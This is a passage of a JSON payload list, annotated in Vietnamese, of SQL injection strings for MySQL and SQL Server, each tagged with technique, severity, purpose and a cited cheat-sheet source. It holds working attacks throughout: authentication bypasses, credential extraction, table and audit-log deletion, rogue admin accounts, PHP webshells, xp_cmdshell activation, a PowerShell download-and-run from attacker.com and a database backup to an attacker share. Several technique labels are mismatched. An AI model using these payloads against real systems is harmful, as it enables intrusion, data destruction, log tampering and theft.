    "description": "Gây lỗi chia cho 0 nếu bảng users tồn tại",
    "source": "Pentestmonkey SQL Server Injection Cheat Sheet"
  },
  {
    "payload": "' AND 1=(SELECT CAST(db_name() AS int)) -- ",
    "type": "In-band",
    "technique": "Error-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Gây lỗi chuyển đổi kiểu để hiển thị tên database hiện tại",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "' AND (SELECT 2*(IF((SELECT * FROM users LIMIT 1)='',1,0))*'') -- -",
    "type": "In-band",
    "technique": "Error-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Sử dụng lỗi toán học để kiểm tra bảng users có dữ liệu",
    "source": "Pentestmonkey MySQL Injection Cheat Sheet"
  },
  {
    "payload": "' AND (SELECT 2*(IF((SELECT * FROM information_schema.tables WHERE table_schema=database() AND table_name='users' LIMIT 1)='',1,0))*'') -- -",
    "type": "In-band",
    "technique": "Error-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Sử dụng lỗi toán học để kiểm tra bảng users tồn tại",
    "source": "OWASP SQL Injection Testing Guide"
  },
  {
    "payload": "'; INSERT INTO users (username, password, email, is_admin) VALUES ('hacker', 'p455w0rd', 'hacker@evil.com', 1) -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Sửa đổi dữ liệu",
    "description": "Thêm tài khoản admin mới vào hệ thống",
    "source": "OWASP SQL Injection Testing Guide"
  },
  {
    "payload": "'; UPDATE users SET email='hacked@evil.com' -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Sửa đổi dữ liệu",
    "description": "Thay đổi email của tất cả người dùng",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "'; INSERT INTO users (username, password, email, admin_level) VALUES ('backdoor', 'h4ck3d', 'evil@hacker.com', 99) -- ",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Sửa đổi dữ liệu",
    "description": "Thêm tài khoản người dùng với quyền cao nhất",
    "source": "Pentestmonkey SQL Server Injection Cheat Sheet"
  },
  {
    "payload": "'; UPDATE users SET admin_level=99 WHERE username='victim' -- ",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Sửa đổi dữ liệu",
    "description": "Nâng cấp quyền của một người dùng cụ thể",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "'; DROP TABLE users -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Xóa dữ liệu",
    "description": "Xóa hoàn toàn bảng users",
    "source": "OWASP SQL Injection Testing Guide"
  },
  {
    "payload": "'; DELETE FROM audit_log -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Xóa dữ liệu",
    "description": "Xóa tất cả các bản ghi nhật ký kiểm toán",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "'; DROP TABLE audit_logs -- ",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Xóa dữ liệu",
    "description": "Xóa hoàn toàn bảng audit_logs",
    "source": "Pentestmonkey SQL Server Injection Cheat Sheet"
  },
  {
    "payload": "'; TRUNCATE TABLE access_logs -- ",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Xóa dữ liệu",
    "description": "Xóa toàn bộ nhật ký truy cập",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a); UPDATE users SET password='hacked' WHERE id=1; -- -",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Sửa đổi dữ liệu",
    "description": "Sử dụng lỗi GROUP BY để thực hiện cập nhật mật khẩu",
    "source": "OWASP SQL Injection Testing Guide"
  },
  {
    "payload": "' AND 1=1; UPDATE users SET password='pwned' WHERE username='admin' -- ",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Sửa đổi dữ liệu",
    "description": "Cập nhật mật khẩu của admin",
    "source": "Pentestmonkey SQL Server Injection Cheat Sheet"
  },
  {
    "payload": "' UNION SELECT 1,2,'<?php include($_GET[\"shell\"]);?>' INTO OUTFILE '/var/www/html/backdoor.php' -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Thực thi lệnh hệ thống",
    "description": "Tạo backdoor PHP để thực thi lệnh từ xa",
    "source": "Pentestmonkey MySQL Injection Cheat Sheet"
  },
  {
    "payload": "'; DROP DATABASE production; -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Xóa dữ liệu",
    "description": "Xóa toàn bộ cơ sở dữ liệu production",
    "source": "OWASP SQL Injection Testing Guide"
  },
  {
    "payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- ",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Thực thi lệnh hệ thống",
    "description": "Kích hoạt xp_cmdshell để thực thi lệnh hệ thống",
    "source": "Pentestmonkey SQL Server Injection Cheat Sheet"
  },
  {
    "payload": "'; UPDATE users SET password='hacked' WHERE id=1; SELECT SLEEP(5); -- -",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Sửa đổi dữ liệu",
    "description": "Cập nhật mật khẩu và gây trì hoãn để xác nhận thành công",
    "source": "OWASP SQL Injection Testing Guide"
  },
  {
    "payload": "'; DROP TABLE access_logs; WAITFOR DELAY '0:0:5'; -- ",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Xóa dữ liệu",
    "description": "Xóa bảng nhật ký truy cập và gây trì hoãn",
    "source": "Pentestmonkey SQL Server Injection Cheat Sheet"
  },
  {
    "payload": "' AND 1=1; DELETE FROM users WHERE id!=1; -- -",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Xóa dữ liệu",
    "description": "Xóa tất cả người dùng trừ người dùng id=1",
    "source": "OWASP SQL Injection Testing Guide"
  },
  {
    "payload": "' AND 1=1 -- ",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "SQL Server",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Kiểm tra điều kiện boolean trả về TRUE",
    "source": "PortSwigger Web Security Academy"
  },
  {
    "payload": "' AND 1=2 -- ",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "SQL Server",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Kiểm tra điều kiện boolean trả về FALSE",
    "source": "PortSwigger Web Security Academy"
  },
  {
    "payload": "' AND (SELECT SUBSTRING(name,1,1) FROM sysobjects WHERE id=1)='a' -- ",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Trích xuất ký tự đầu tiên của tên đối tượng",
    "source": "OWASP Testing Guide v4"
  },
  {
    "payload": "' WAITFOR DELAY '0:0:5' -- ",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Gây trì hoãn 5 giây để xác định lỗ hổng",
    "source": "Pentestmonkey SQL Server Injection Cheat Sheet"
  },
  {
    "payload": "' IF 1=1 WAITFOR DELAY '0:0:5' -- ",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Trì hoãn có điều kiện để xác nhận lỗ hổng",
    "source": "PortSwigger Web Security Academy"
  },
  {
    "payload": "' IF (SELECT ASCII(SUBSTRING(@@version,1,1)))=53 WAITFOR DELAY '0:0:5' -- ",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Xác định phiên bản SQL Server bằng kỹ thuật time-based",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "'; UPDATE users SET password='hacked' WHERE username='admin' -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Sửa đổi dữ liệu",
    "description": "Thay đổi mật khẩu của admin",
    "source": "OWASP SQL Injection Testing Guide"
  },
  {
    "payload": "'; UPDATE users SET is_admin=1 WHERE username='hacker' -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Sửa đổi dữ liệu",
    "description": "Nâng cấp quyền của người dùng thành admin",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "'; UPDATE users SET password='hacked' WHERE username='admin' -- ",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Sửa đổi dữ liệu",
    "description": "Thay đổi mật khẩu của admin trong SQL Server",
    "source": "Pentestmonkey SQL Server Injection Cheat Sheet"
  },
  {
    "payload": "'; DELETE FROM users WHERE username!='admin' -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Xóa dữ liệu",
    "description": "Xóa tất cả người dùng trừ admin",
    "source": "OWASP SQL Injection Testing Guide"
  },
  {
    "payload": "'; TRUNCATE TABLE logs -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Xóa dữ liệu",
    "description": "Xóa toàn bộ bảng logs",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "'; DELETE FROM users -- ",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Xóa dữ liệu",
    "description": "Xóa toàn bộ bảng users",
    "source": "Pentestmonkey SQL Server Injection Cheat Sheet"
  },
  {
    "payload": "'; SELECT LOAD_FILE('/etc/passwd') -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Thực thi lệnh hệ thống",
    "description": "Đọc file /etc/passwd trên hệ thống",
    "source": "Pentestmonkey MySQL Injection Cheat Sheet"
  },
  {
    "payload": "'; SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php' -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Thực thi lệnh hệ thống",
    "description": "Tạo webshell PHP để thực thi lệnh hệ thống",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "'; EXEC xp_cmdshell 'net user hacker P@ssw0rd /add' -- ",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Thực thi lệnh hệ thống",
    "description": "Thêm người dùng hacker vào hệ thống",
    "source": "Pentestmonkey SQL Server Injection Cheat Sheet"
  },
  {
    "payload": "'; EXEC master..xp_cmdshell 'powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')\"' -- ",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Thực thi lệnh hệ thống",
    "description": "Tải và thực thi script PowerShell từ xa",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "' -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Thấp",
    "purpose": "Truy cập trái phép",
    "description": "Comment phần còn lại của truy vấn để xác định lỗ hổng",
    "source": "OWASP SQL Injection Testing Guide"
  },
  {
    "payload": "admin' -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Thấp",
    "purpose": "Truy cập trái phép",
    "description": "Đăng nhập với tên 'admin' mà không cần mật khẩu",
    "source": "PortSwigger Web Security Academy"
  },
  {
    "payload": "' -- ",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Thấp",
    "purpose": "Truy cập trái phép",
    "description": "Comment phần còn lại của truy vấn để xác định lỗ hổng",
    "source": "OWASP SQL Injection Testing Guide"
  },
  {
    "payload": "admin' -- ",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Thấp",
    "purpose": "Truy cập trái phép",
    "description": "Đăng nhập với tên 'admin' mà không cần mật khẩu",
    "source": "PortSwigger Web Security Academy"
  },
  {
    "payload": "') OR ('1'='1",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Bypass đăng nhập trong trường hợp truy vấn có cấu trúc khác",
    "source": "OWASP SQL Injection Prevention Cheat Sheet"
  },
  {
    "payload": "1' ORDER BY 10 -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Xác định số cột bằng ORDER BY",
    "source": "PortSwigger Web Security Academy"
  },
  {
    "payload": "1' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Liệt kê tất cả các bảng trong cơ sở dữ liệu hiện tại",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "1' UNION SELECT NULL,NULL,NULL,CONCAT(table_schema,'.',table_name) FROM information_schema.tables -- -",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Liệt kê tất cả các bảng trên tất cả cơ sở dữ liệu",
    "source": "Pentestmonkey MySQL Injection Cheat Sheet"
  },
  {
    "payload": "1; BACKUP DATABASE master TO DISK='\\\\attackerserver\\share\\backup.bak' -- ",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Sao lưu cơ sở dữ liệu ra bên ngoài",
    "source": "Pentestmonkey SQL Server Injection Cheat Sheet"
  },
  {
    "payload": "1; SELECT * FROM master..sysdatabases -- ",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Liệt kê tất cả các cơ sở dữ liệu",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='mysql')>1 -- -",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Xác nhận số lượng bảng trong schema mysql",
    "source": "PortSwigger Web Security Academy"
  },
  {
    "payload": "' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'a%')>0 -- -",
    "type": "Blind",
    "technique": "Boolean-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Xác định có username bắt đầu bằng 'a' hay không",
    "source": "HackTricks SQL Injection Guide"
  },
  {
    "payload": "' OR 1=1--",
    "type": "In-band",
    "technique": "Boolean-based",
    "dbms": "MySQL",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Tận dụng điều kiện luôn đúng để truy cập trái phép hoặc kiểm thử tính hợp lệ của câu truy vấn.",
    "source": "Invicti SQL Injection Cheat Sheet"
  },
  {
    "payload": "' AND 1=0--",
    "type": "In-band",
    "technique": "Boolean-based",
    "dbms": "MySQL",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Tận dụng điều kiện luôn đúng để truy cập trái phép hoặc kiểm thử tính hợp lệ của câu truy vấn.",
    "source": "Invicti SQL Injection Cheat Sheet"
  },
  {
    "payload": "1 OR 1=1--",
    "type": "In-band",
    "technique": "Boolean-based",
    "dbms": "MySQL",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Sử dụng biến thể Boolean-based không dùng ký tự đặc biệt để xác thực luôn đúng.",
    "source": "Invicti SQL Injection Cheat Sheet"
  },
  {
    "payload": "' OR 'x'='x--",
    "type": "In-band",
    "technique": "Boolean-based",
    "dbms": "MySQL",
    "severity": "Thấp",
    "purpose": "Truy cập trái phép",
    "description": "Điều kiện chuỗi luôn đúng (x = x) để bypass xác thực.",
    "source": "Invicti SQL Injection Cheat Sheet"
  },
  {
    "payload": "' OR 'a'='a--",
    "type": "In-band",
    "technique": "Boolean-based",
    "dbms": "MySQL",
    "severity": "Thấp",
    "purpose": "Truy cập trái phép",
    "description": "Điều kiện chuỗi luôn đúng (a = a) dùng để tìm lỗi SQLi.",
    "source": "Invicti SQL Injection Cheat Sheet"
  },
  {
    "payload": "' OR 1=1#",
    "type": "In-band",
    "technique": "Boolean-based",
    "dbms": "MySQL",
    "severity": "Thấp",
    "purpose": "Truy cập trái phép",
    "description": "Sử dụng ký tự '#' để comment kết thúc truy vấn, điều kiện OR 1=1 luôn đúng.",
    "source": "Invicti SQL Injection Cheat Sheet"
  },
  {
    "payload": "' OR 1=1/*",
    "type": "In-band",
    "technique": "Boolean-based",
    "dbms": "MySQL",
    "severity": "Thấp",
    "purpose": "Truy cập trái phép",
    "description": "Sử dụng comment kiểu C (/* */) kết thúc truy vấn với OR 1=1.",
    "source": "Invicti SQL Injection Cheat Sheet"
  },
  {
    "payload": "' OR USER() LIKE 'r%'--",
    "type": "In-band",
    "technique": "Boolean-based",
    "dbms": "MySQL",
    "severity": "Thấp",
    "purpose": "Truy cập trái phép",
    "description": "So sánh thông tin người dùng, tận dụng lỗ hổng để xác minh điều kiện.",
    "source": "PortSwigger Web Security Academy SQLi Cheatsheet"
  },
  {
    "payload": "' OR SUBSTRING(USER(),1,1)='r'--",
    "type": "In-band",
    "technique": "Boolean-based",
    "dbms": "MySQL",
    "severity": "Thấp",
    "purpose": "Truy cập trái phép",
    "description": "Trích xuất kí tự đầu tên đăng nhập qua lệnh điều kiện.",
    "source": "PortSwigger Web Security Academy SQLi Cheatsheet"
  },
  {
    "payload": "' UNION SELECT 1,2,3--",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Union đơn giản với 3 cột để tìm hiểu số cột của bảng.",
    "source": "HackTricks - Pentesting SQL Injection"
  },
  {
    "payload": "' UNION SELECT 1, USER(), DATABASE()--",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Dùng UNION để trích xuất tên người dùng và tên cơ sở dữ liệu.",
    "source": "HackTricks - Pentesting SQL Injection"
  },
  {
    "payload": "' UNION SELECT 1,@@version--",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Union lấy phiên bản máy chủ cơ sở dữ liệu.",
    "source": "HackTricks - Pentesting SQL Injection"
  },
  {
    "payload": "' AND 1=0 UNION SELECT username,password FROM users--",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Bypass chọn dữ liệu từ bảng users bằng UNION sau điều kiện sai.",
    "source": "HackTricks - Pentesting SQL Injection"
  },
  {
    "payload": "' UNION SELECT 1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables)--",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Union danh sách tên bảng (group_concat) từ information_schema.",
    "source": "HackTricks - Pentesting SQL Injection"
  },
  {
    "payload": "' UNION SELECT NULL,NULL--",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Union thay thế NULL cho mọi cột, dùng thử nhiều cột truy vấn.",
    "source": "HackTricks - Pentesting SQL Injection"
  },
  {
    "payload": "0' UNION SELECT 1,2--",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Union injection thử nghiệm với 2 cột.",
    "source": "HackTricks - Pentesting SQL Injection"
  },
  {
    "payload": "0' UNION SELECT DATABASE(),NULL--",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Union lấy tên database hiện tại.",
    "source": "HackTricks - Pentesting SQL Injection"
  },
  {
    "payload": "' UNION ALL SELECT LOAD_FILE('/etc/passwd')--",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Union dùng LOAD_FILE để đọc file hệ thống (chỉ đọc được file toàn cục).",
    "source": "PentestMonkey MySQL SQLi Cheat Sheet"
  },
  {
    "payload": "' UNION SELECT 1,current_user()--",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Union lấy thông tin user hiện tại.",
    "source": "HackTricks - Pentesting SQL Injection"
  },
  {
    "payload": "' UNION SELECT 1,(SELECT GROUP_CONCAT(name) FROM master.sys.databases)--",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Union liệt kê cơ sở dữ liệu trên SQL Server.",
    "source": "PentestMonkey MySQL SQLi Cheat Sheet"
  },
  {
    "payload": "0' UNION SELECT @@version,NULL--",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Union lấy phiên bản SQL Server.",
    "source": "PentestMonkey MySQL SQLi Cheat Sheet"
  },
  {
    "payload": "1' UNION SELECT CHAR(117)+CHAR(115)+CHAR(101)+CHAR(114)--",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Union dùng hàm CHAR ghép ra chuỗi 'user'.",
    "source": "PentestMonkey MySQL SQLi Cheat Sheet"
  },
  {
    "payload": "' UNION SELECT NAME,1 FROM master..syslogins--",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Truy cập trái phép",
    "description": "Union lấy tên đăng nhập từ syslogins.",
    "source": "PentestMonkey MySQL SQLi Cheat Sheet"
  },
  {
    "payload": "' UNION SELECT 1,2,3--",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Union đơn giản để thử nghiệm nhiều cột trên SQL Server.",
    "source": "PentestMonkey MySQL SQLi Cheat Sheet"
  },
  {
    "payload": "1' UNION SELECT 1,2,3--",
    "type": "In-band",
    "technique": "UNION-based",
    "dbms": "SQL Server",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Union đơn giản để xác định số cột.",
    "source": "PentestMonkey MySQL SQLi Cheat Sheet"
  },
  {
    "payload": "' AND 1=0 HAVING 1=1--",
    "type": "In-band",
    "technique": "Error-based",
    "dbms": "MySQL",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Error-based: ép HAVING gây lỗi để tìm số cột hoặc thông tin.",
    "source": "Invicti SQL Injection Cheat Sheet"
  },
  {
    "payload": "1 OR 1=CONVERT(int,@@version)--",
    "type": "In-band",
    "technique": "Error-based",
    "dbms": "SQL Server",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Error-based SQLi: ép SQL Server phân tích giá trị gây lỗi hiển thị thông tin.",
    "source": "HackTricks - MSSQL Injection"
  },
  {
    "payload": "1' + USER_NAME(@@VERSION)--",
    "type": "In-band",
    "technique": "Error-based",
    "dbms": "SQL Server",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Error-based SQLi: tận dụng USER_NAME() để gây lỗi và lộ thông tin.",
    "source": "HackTricks - MSSQL Injection"
  },
  {
    "payload": "1; DROP TABLE users--",
    "type": "In-band",
    "technique": "Stacked Queries",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Xóa dữ liệu",
    "description": "Stacked query: DROP TABLE xóa bảng dữ liệu.",
    "source": "Invicti SQL Injection Cheat Sheet"
  },
  {
    "payload": "1; DELETE FROM orders--",
    "type": "In-band",
    "technique": "Stacked Queries",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Xóa dữ liệu",
    "description": "Stacked query: DELETE FROM xóa dữ liệu từ bảng.",
    "source": "Invicti SQL Injection Cheat Sheet"
  },
  {
    "payload": "'; UPDATE users SET admin=1--",
    "type": "In-band",
    "technique": "Stacked Queries",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Sửa đổi dữ liệu",
    "description": "Stacked query: thay đổi quyền user qua UPDATE.",
    "source": "Invicti SQL Injection Cheat Sheet"
  },
  {
    "payload": "'; INSERT INTO users(name) VALUES('test')--",
    "type": "In-band",
    "technique": "Stacked Queries",
    "dbms": "MySQL",
    "severity": "Trung bình",
    "purpose": "Sửa đổi dữ liệu",
    "description": "Stacked query: chèn một bản ghi mới vào users.",
    "source": "Invicti SQL Injection Cheat Sheet"
  },
  {
    "payload": "'; CREATE TABLE hacktest(id int)--",
    "type": "In-band",
    "technique": "Stacked Queries",
    "dbms": "MySQL",
    "severity": "Cao",
    "purpose": "Thực thi lệnh hệ thống",
    "description": "Stacked query: tạo bảng mới trên hệ thống.",
    "source": "Invicti SQL Injection Cheat Sheet"
  },
  {
    "payload": "1; EXEC xp_cmdshell 'whoami'--",
    "type": "In-band",
    "technique": "Stacked Queries",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Thực thi lệnh hệ thống",
    "description": "Stacked query trên SQL Server: dùng xp_cmdshell thực thi lệnh OS.",
    "source": "PentestMonkey MySQL SQLi Cheat Sheet"
  },
  {
    "payload": "1; DROP TABLE members--",
    "type": "In-band",
    "technique": "Stacked Queries",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Xóa dữ liệu",
    "description": "Stacked query: DROP TABLE xóa bảng members.",
    "source": "PentestMonkey MySQL SQLi Cheat Sheet"
  },
  {
    "payload": "1; UPDATE members SET password='pw'--",
    "type": "In-band",
    "technique": "Stacked Queries",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Sửa đổi dữ liệu",
    "description": "Stacked query: thay đổi mật khẩu của user.",
    "source": "PentestMonkey MySQL SQLi Cheat Sheet"
  },
  {
    "payload": "1; INSERT INTO members(login) VALUES('a')--",
    "type": "In-band",
    "technique": "Stacked Queries",
    "dbms": "SQL Server",
    "severity": "Trung bình",
    "purpose": "Sửa đổi dữ liệu",
    "description": "Stacked query: thêm người dùng mới trong bảng members.",
    "source": "PentestMonkey MySQL SQLi Cheat Sheet"
  },
  {
    "payload": "1; DELETE FROM members--",
    "type": "In-band",
    "technique": "Stacked Queries",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Xóa dữ liệu",
    "description": "Stacked query: xóa dữ liệu trong bảng members.",
    "source": "PentestMonkey MySQL SQLi Cheat Sheet"
  },
  {
    "payload": "1; CREATE TABLE hack (id int)--",
    "type": "In-band",
    "technique": "Stacked Queries",
    "dbms": "SQL Server",
    "severity": "Cao",
    "purpose": "Thực thi lệnh hệ thống",
    "description": "Stacked query: tạo bảng hack trên SQL Server.",
    "source": "PentestMonkey MySQL SQLi Cheat Sheet"
  },
  {
    "payload": "' OR SLEEP(5)--",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "MySQL",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Time-based SQLi: SLEEP(5) trì hoãn phản hồi khi điều kiện đúng.",
    "source": "PayloadBox SQL Injection Payload List"
  },
  {
    "payload": "' OR IF(1=1,SLEEP(5),0)--",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "MySQL",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Time-based SQLi: IF điều kiện đúng chạy SLEEP, giúp nhận biết lỗ hổng.",
    "source": "PayloadBox SQL Injection Payload List"
  },
  {
    "payload": "' OR BENCHMARK(5000000,MD5('a'))--",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "MySQL",
    "severity": "Trung bình",
    "purpose": "Truy cập trái phép",
    "description": "Time-based SQLi: dùng BENCHMARK tạo độ trễ.",
    "source": "PayloadBox SQL Injection Payload List"
  },
  {
    "payload": "' AND SLEEP(5)--",
    "type": "Blind",
    "technique": "Time-based",
    "dbms": "MySQL",
    "severity": "Thấp",
    "purpose": "Truy cập trái phép",
    "description": "Time-based SQLi: thêm điều kiện SLEEP để tạo chậm trễ.",
    "source": "PayloadBox SQL Injection Payload List"
  },
  {
    "payload": "' OR SLEEP(10)--",
